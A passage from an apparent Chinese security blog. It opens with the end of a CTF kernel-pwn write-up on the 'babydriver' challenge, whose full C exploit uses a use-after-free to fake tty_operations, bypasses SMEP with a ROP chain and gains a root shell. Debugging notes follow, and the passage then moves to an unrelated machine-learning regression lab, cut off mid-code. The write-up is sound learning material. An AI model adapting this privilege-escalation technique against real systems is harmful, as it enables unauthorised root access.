class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred_addr 0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds_addr 0xffffffff810a1420</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">			<span class="string">&quot;pushf;&quot;</span></span><br><span class="line">			<span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds_addr;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810d238d</span>;		<span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81004d80</span>;		<span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81063694</span>;		<span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff814e35ef</span>;		<span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">    rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		fake_tty_operations[i] = <span class="number">0xFFFFFFFF8181BFC5</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    fake_tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff810635f5</span>; <span class="comment">// pop rax; pop rbp; ret;</span></span><br><span class="line">    fake_tty_operations[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;</span><br><span class="line">    fake_tty_operations[<span class="number">3</span>] = <span class="number">0xFFFFFFFF8181BFC5</span>; <span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY); <span class="comment">// tty_struct已经申请到babydev_struct中</span></span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2, fake_tty_struct, <span class="number">32</span>); <span class="comment">// 把tty_struct读取到fake_tty_struct</span></span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations; <span class="comment">// 修改tty_operations指向fake_tty_operations</span></span><br><span class="line">    write(fd2,fake_tty_struct, <span class="number">32</span>); <span class="comment">// 用fake_tty_struct覆盖tty_struct</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// buf压栈,作为栈迁移的跳板</span></span><br><span class="line">    write(fd_tty, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了理解这个 exp，我们调试一下：</p>
<ul>
<li>获取 babydrive 模块的加载地址：（在 “/sys/module/” 中是加载的各个模块的信息）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/<span class="keyword">module</span>/babydriver/sections/.text </span><br><span class="line"><span class="number">0xffffffffc0000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用 add-symbol-file 添加符号</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file babydriver.ko <span class="number">0xffffffffc0000000</span></span><br><span class="line">add symbol table from file <span class="string">&quot;babydriver.ko&quot;</span> at</span><br><span class="line">	.text_addr = <span class="number">0xffffffffc0000000</span></span><br><span class="line">Reading symbols from babydriver.ko...</span><br></pre></td></tr></table></figure>
<img src="/2022/05/17/kernel%20UAF/1653064701599.png" class width="1653064701599"> 
<ul>
<li>在执行“write(fd_tty, buf, 8)”（“fake_tty_operations[7]-0xffffffff8181bfc5”）前停止</li>
<li>此时RAX为：“fake_tty_operations[0]-0xffffffff810635f5”（通过这个“rax + 0x38”可以看出来）</li>
<li>接下来就会执行：“mov rsp,rax ; dec ebx ; ret”（“fake_tty_operations[7]-0xffffffff8181bfc5”）</li>
<li>栈迁移为：“fake_tty_operations[0]-0xffffffff810635f5”</li>
<li>接着“ret”执行ROP链（“fake_tty_operations[1]”）</li>
<li>最后在ROP链中 <strong>bypass-smep</strong>，并且用 ret2usr 进行提权</li>
</ul>
<p>这里我要吐槽一句：kernel 的调试实在是太慢了，“ni”要足足执行一秒钟，还有这个 exp 是打不通的，必须把 boot.sh 中的 -enable-kvm 去掉才可以打通（快搞死我了）</p>
<hr>
<p><strong>小结：</strong></p>
<p>这是我的第二个 kernel pwn，感觉顺畅多了，这个题目给我提供了另一个提权的思路：UAF</p>
<p>目前有许多概念很是陌生，比如这个“cdev结构体”，我感觉它和 ucore 中的“vdev结构体”很像，但是就是不了解“cdev结构体”与其背后的机制</p>
<p>从 ucore 到 Linux 还是有距离的，那天抽时间整理一下 Linux 内核的知识</p>
<p>还有 kernel 是真的不好调试，太慢了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/Machine-Learning-Lab5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/17/Machine-Learning-Lab5/" class="post-title-link" itemprop="url">Machine-Learning-Lab5</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-17 14:52:39" itemprop="dateCreated datePublished" datetime="2022-05-17T14:52:39+08:00">2022-05-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-10 00:08:12" itemprop="dateModified" datetime="2022-10-10T00:08:12+08:00">2022-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AI/" itemprop="url" rel="index"><span itemprop="name">AI</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>在本练习中，您将实现正则化线性回归，并使用它来研究具有不同偏差-方差特性的模型</p>
<ul>
<li>ex5.m - Octave/MATLAB脚本，帮助您完成练习 </li>
<li>ex5data1.mat - 数据集 </li>
<li>submit.m - 将您的解决方案发送到我们的服务器 </li>
<li>featureNormalize.m - 标准化函数 </li>
<li>fmincg.m - 拟合函数，最小化例程（类似于fminunc） </li>
<li>plotFit.m - 绘制多项式拟合图 </li>
<li>trainLinearReg.m - 使用 fmincg 训练线性回归（代价函数为：均方误差）</li>
<li>[?] linearRegCostFunction.m - 正则线性回归代价函数</li>
<li>[?] learningCurve.m - 生成学习曲线 </li>
<li>[?] polyFeatures.m - 将数据映射到多项式特征空间 </li>
<li>[?] validationCurve.m - 生成交叉验证曲线 </li>
</ul>
<h2 id="Regularized-Linear-Regression（正则线性回归）"><a href="#Regularized-Linear-Regression（正则线性回归）" class="headerlink" title="Regularized Linear Regression（正则线性回归）"></a>Regularized Linear Regression（正则线性回归）</h2><p>在本练习的前半部分，您将使用正则化线性回归，利用水库水位的变化来预测流出大坝的水量，在下半部分中，您将完成一些调试学习算法的诊断，并检查偏差与方差的影响 </p>
<h2 id="Visualizing-the-dataset（可视化数据集）"><a href="#Visualizing-the-dataset（可视化数据集）" class="headerlink" title="Visualizing the dataset（可视化数据集）"></a>Visualizing the dataset（可视化数据集）</h2><p>首先，我们将可视化数据集，其中包含：</p>
<ul>
<li>水位变化的历史记录 x</li>
<li>流出大坝的水量 y </li>
</ul>
<p>该数据集分为三个部分：</p>
<ul>
<li>你的模型将学习的训练集：X，y</li>
<li>用于确定正则化参数的交叉验证集：Xval，yval</li>
<li>用于评估性能的测试集，这些是您的模型在培训期间没有看到的“看不见的”示例：Xtest、ytest</li>
</ul>
<p>代码实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ============================== 1.读取并显示数据 ==============================</span></span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data\ex5data1.mat&#x27;</span>)</span><br><span class="line"><span class="comment"># 用于训练模型</span></span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">Y = data[<span class="string">&#x27;y&#x27;</span>].flatten()</span><br><span class="line"><span class="comment"># 用于确定正则化参数的交叉验证</span></span><br><span class="line">Xval = data[<span class="string">&#x27;Xval&#x27;</span>]</span><br><span class="line">Yval = data[<span class="string">&#x27;yval&#x27;</span>].flatten()</span><br><span class="line"><span class="comment"># 用于评估性能</span></span><br><span class="line">Xtest = data[<span class="string">&#x27;Xtest&#x27;</span>]</span><br><span class="line">Ytest = data[<span class="string">&#x27;ytest&#x27;</span>].flatten()</span><br><span class="line"></span><br><span class="line">plt.figure(<span class="number">1</span>)</span><br><span class="line">plt.scatter(X,Y,c=<span class="string">&#x27;r&#x27;</span>,marker=<span class="string">&#x27;x&#x27;</span>) <span class="comment"># 只显示&quot;用于训练模型&quot;的数据</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Change in water level (x)&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Water folowing out of the dam (y)&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<img src="/2022/05/17/Machine-Learning-Lab5/1652700354337.png" class width="1652700354337"> 
<h2 id="Regularized-linear-regression-cost-function（正则线性回归代价函数）"><a href="#Regularized-linear-regression-cost-function（正则线性回归代价函数）" class="headerlink" title="Regularized linear regression cost function（正则线性回归代价函数）"></a>Regularized linear regression cost function（正则线性回归代价函数）</h2><p>先看下正则化均方误差的公式：</p>
<script type="math/tex; mode=display">
J(θ)=\frac1{2m}[\sum_{i=1}^m(h_θ(x^{(i)})−y^{(i)})^2+λ\sum_{j=1}^nθ_j^{2}]</script><ul>
<li>其中 λ 是控制正则化程度的正则化参数（因此，有助于防止过度拟合）</li>
<li>正则化项对总成本 J(θ) 施加惩罚，随着模型参数 θ 的大小增加，惩罚也增加</li>
<li>注意：不应该正则化θ0项（在 Octave/MATLAB 中，θ0 项表示为 θ(1) ，因为 Octave/MATLAB 中的索引从1开始）</li>
</ul>
<p>相应地，正则化线性回归的代价对 θj 的偏导数定义为：</p>
<script type="math/tex; mode=display">
\frac{∂J(θ)}{∂θ_0}=\frac{1}{m}\sum_{i=1}^{m}(h_θ(x^{(i)})-y^{(i)})x_{j}^{(i)}\quad for\,\,j=0\\
\frac{∂J(θ)}{∂θ_0}=(\frac{1}{m}\sum_{i=1}^{m}(h_θ(x^{(i)})-y^{(i)})x_{j}^{(i)})+\frac{λ}{m}θ_j\quad for\,\,j>0</script><ul>
<li>注意：导数和梯度是一个概念，求解偏导数，就是求解梯度</li>
</ul>
<p>现在，您应该完成文件 linearRegCostFunction.m 中的代码，您的任务是编写一个函数来计算正则化线性回归成本函数，如果可能，尝试将代码矢量化，避免编写循环，然后在本函数中添加代码来计算梯度，并返回变量 grad</p>
<p>实现 linearRegCostFunction 函数：正则线性回归代价函数（均方误差）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;计算线性回归的代价和梯度&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear_cost_function</span>(<span class="params">X,Y,theta,lmd</span>):</span></span><br><span class="line">	m = X.shape[<span class="number">0</span>]</span><br><span class="line">	hyp = X.dot(theta) - Y</span><br><span class="line">	grad = np.zeros(theta.shape) </span><br><span class="line"></span><br><span class="line">	cost = ((hyp.T).dot(hyp) + lmd * (theta.T).dot(theta))/(<span class="number">2</span>*m)</span><br><span class="line"></span><br><span class="line">	temp = (X.T).dot(hyp)</span><br><span class="line">	grad[<span class="number">0</span>] = temp[<span class="number">0</span>]/ m</span><br><span class="line">	grad[<span class="number">1</span>:] = (temp[<span class="number">1</span>:] + lmd * theta[<span class="number">1</span>:])/m</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> cost,grad</span><br></pre></td></tr></table></figure>
<ul>
<li>就是实现了一下上述公式，和实验二的 cost_Function_Reg 一样</li>
</ul>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ============================ 2.计算代价和梯度 ==============================</span></span><br><span class="line">(m,n)= X.shape</span><br><span class="line">theta = np.ones((n+<span class="number">1</span>))</span><br><span class="line">lmd=<span class="number">1</span></span><br><span class="line">cost,grad = linear_cost_function(np.column_stack((np.ones(m),X)),Y,theta,lmd)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Cost at theta = [1  1]: &#123;:0.6f&#125;\n(this value should be about 303.993192)&#x27;</span>.<span class="built_in">format</span>(cost))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Gradient at theta = [1  1]: &#123;&#125;\n(this value should be about [-15.303016  598.250744]&#x27;</span>.<span class="built_in">format</span>(grad))</span><br></pre></td></tr></table></figure>
<h2 id="Fitting-linear-regression（拟合线性回归）"><a href="#Fitting-linear-regression（拟合线性回归）" class="headerlink" title="Fitting linear regression（拟合线性回归）"></a>Fitting linear regression（拟合线性回归）</h2><p>将在 trainLinearReg.m 中运行代码，来计算 θ 的最佳值（使用 fmincg 拟合代价函数）</p>
<ul>
<li>在这一部分中，我们将正则化参数λ设置为“0”（因为我们目前线性回归的实现是试图拟合二维 θ，所以正则化对如此低维的θ没有明显的帮助）</li>
<li>在本练习的后面部分，您将使用带正则化的多项式回归</li>
<li>最后是 ex5.m 脚本还应绘制最佳拟合线，最佳拟合线会告诉我们：由于数据具有非线性模式，因此模型与数据的拟合度不高</li>
<li>虽然可视化显示最佳拟合是调试学习算法的一种可能方法，但可视化数据和模型并不总是容易的，在下一节中，您将实现一个生成学习曲线的函数，该函数可以帮助您调试学习算法，即使数据不容易可视化</li>
</ul>
<p>实现 trainLinearReg 函数：使用 fmincg 训练线性回归（代价函数为：均方误差）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> linearCostFunction <span class="keyword">import</span> linear_cost_function</span><br><span class="line"><span class="keyword">import</span> scipy.optimize <span class="keyword">as</span> opt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train_linear_reg</span>(<span class="params">X,Y,lmd</span>):</span></span><br><span class="line">	init_theta = np.ones(X.shape[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">cost_func</span>(<span class="params">t</span>):</span></span><br><span class="line">		<span class="keyword">return</span> linear_cost_function(X,Y,t,lmd)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">grad_func</span>(<span class="params">t</span>):</span></span><br><span class="line">		<span class="keyword">return</span> linear_cost_function(X,Y,t,lmd)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">	theta,*unused = opt.fmin_cg(cost_func,init_theta,grad_func,maxiter=<span class="number">200</span>,disp=<span class="literal">False</span>,full_output =<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> theta</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 fmincg 进行拟合</li>
</ul>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =========================== 3.训练线性回归 ===========================</span></span><br><span class="line">lmd = <span class="number">0</span></span><br><span class="line">theta = train_linear_reg(np.column_stack((np.ones(m),X)),Y,lmd)</span><br><span class="line">plt.plot(X,np.column_stack((np.ones(m),X)).dot(theta))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘图结果：</p>
<img src="/2022/05/17/Machine-Learning-Lab5/1652705076474.png" class width="1652705076474"> 
<h2 id="Bias-variance（偏差方差）"><a href="#Bias-variance（偏差方差）" class="headerlink" title="Bias-variance（偏差方差）"></a>Bias-variance（偏差方差）</h2><p>机器学习中的一个重要概念是：偏差方差</p>
<ul>
<li>具有高偏差的模型对于数据来说不够复杂，并且倾向于欠拟合</li>
<li>而具有高方差的模型对训练数据过度拟合</li>
</ul>
<p>在这部分练习中，您将在学习曲线上绘制训练和测试错误，以诊断 “偏差-方差” 问题</p>
<h2 id="Learning-curves-A（学习曲线）"><a href="#Learning-curves-A（学习曲线）" class="headerlink" title="Learning curves A（学习曲线）"></a>Learning curves A（学习曲线）</h2><p>现在，您将实现生成学习曲线的代码，这些曲线在调试学习算法时非常有用</p>
<ul>
<li>为了绘制学习曲线，我们需要使用不同的训练集大小进行训练，得出交叉验证的误差（分别得出训练集，测试集的误差）</li>
<li>要获得不同的训练集大小，应使用原始训练集X的不同子集，可以使用 trainLinearReg 函数来查找θ参数</li>
<li>请注意，lambda 作为参数传递给 learningCurve 函数，在学习θ参数之后，应该计算训练集和交叉验证集的误差</li>
</ul>
<p>实现 learningCurve 函数：生成学习曲线</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> linearCostFunction <span class="keyword">import</span> linear_cost_function <span class="comment"># 正则线性回归代价函数(均方误差)</span></span><br><span class="line"><span class="keyword">from</span> trainLinearRegression <span class="keyword">import</span> train_linear_reg <span class="comment"># 拟合函数fmincg</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">learning_curve</span>(<span class="params">X,Y,Xval,Yval,lmd</span>):</span></span><br><span class="line">	m = X.shape[<span class="number">0</span>]</span><br><span class="line">	error_train = np.zeros(m)</span><br><span class="line">	error_val = np.zeros(m)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">		theta = train_linear_reg(X[<span class="number">0</span>:num+<span class="number">1</span>,:],Y[<span class="number">0</span>:num+<span class="number">1</span>],lmd) <span class="comment"># 使用fmincg训练模型</span></span><br><span class="line"></span><br><span class="line">		error_train[num],_ = linear_cost_function(X[<span class="number">0</span>:num+<span class="number">1</span>,:],Y[<span class="number">0</span>:num+<span class="number">1</span>],theta,lmd) <span class="comment"># 获取训练集的cost代价</span></span><br><span class="line">		error_val[num],_ = linear_cost_function(Xval,Yval,theta,lmd) <span class="comment"># 获取测试集的cost代价</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> error_train,error_val</span><br></pre></td></tr></table></figure>
<ul>
<li>zeros()：返回来一个给定形状和类型的，用“0”填充的数组</li>
</ul>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =========================== 4.线性回归的学习曲线 ==============</span></span><br><span class="line">lmd = <span class="number">0</span> <span class="comment"># 不包括正则化项</span></span><br><span class="line">error_train,error_val = learning_curve(np.column_stack((np.ones(m),X)),Y,</span><br><span class="line">						np.column_stack((np.ones(Yval.size),Xval)),Yval,lmd)</span><br><span class="line">plt.figure(<span class="number">2</span>)</span><br><span class="line">plt.plot(<span class="built_in">range</span>(m),error_train,<span class="built_in">range</span>(m),error_val)</span><br><span class="line">plt.title(<span class="string">&#x27;Learning Curve for Linear Regression&#x27;</span>)</span><br><span class="line">plt.legend([<span class="string">&#x27;Train&#x27;</span>, <span class="string">&#x27;Cross Validation&#x27;</span>])</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Number of Training Examples&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">plt.axis([<span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">150</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：这里直接用“代价”来表示“误差”，其实它们两个本来就是同一个概念（反正它们都是用同一个公式计算出来的）</li>
</ul>
<img src="/2022/05/17/Machine-Learning-Lab5/1652713389053.png" class width="1652713389053"> 
<ul>
<li>随着训练集数目m的增大，训练集和测试集的误差都逐渐趋于平缓，证明模型欠拟合</li>
</ul>
<h2 id="Polynomial-regression（多项式回归）"><a href="#Polynomial-regression（多项式回归）" class="headerlink" title="Polynomial regression（多项式回归）"></a>Polynomial regression（多项式回归）</h2><p>我们的线性模型的问题是，它对数据来说太简单，导致拟合不足（高偏差）</p>
<p>在本练习的这一部分中，您将通过添加更多功能来解决此问题，对于多项式回归，我们的假设有以下形式： </p>
<script type="math/tex; mode=display">
hθ(x)=θ_0+θ_1(waterLevel)+θ_2(waterLevel)^2+ ... +θ_p(waterLevel)^p\\</script><script type="math/tex; mode=display">
hθ(x)=θ_0+θ_1x_1+θ_2x_2+ ... +θ_px_p</script><p>现在，您将使用“更高的x次方”这一方式（第一个公式），在数据集中添加更多功能，这一部分的任务是完成 polyFeatures 中的代码</p>
<p>实现 polyFeatures 函数：将数据映射到多项式特征空间 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ploy_feature</span>(<span class="params">X,p</span>):</span></span><br><span class="line">	m = X.shape[<span class="number">0</span>] <span class="comment"># 读取矩阵的长度,(&quot;shape[0]&quot;就是读取矩阵第一维度的长度)</span></span><br><span class="line">	X_poly = np.zeros((m,p)) <span class="comment"># 添加更多特征</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,p+<span class="number">1</span>):</span><br><span class="line">		X_poly[:,num-<span class="number">1</span>] = X.flatten() ** num <span class="comment"># 添加&quot;次方项&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> 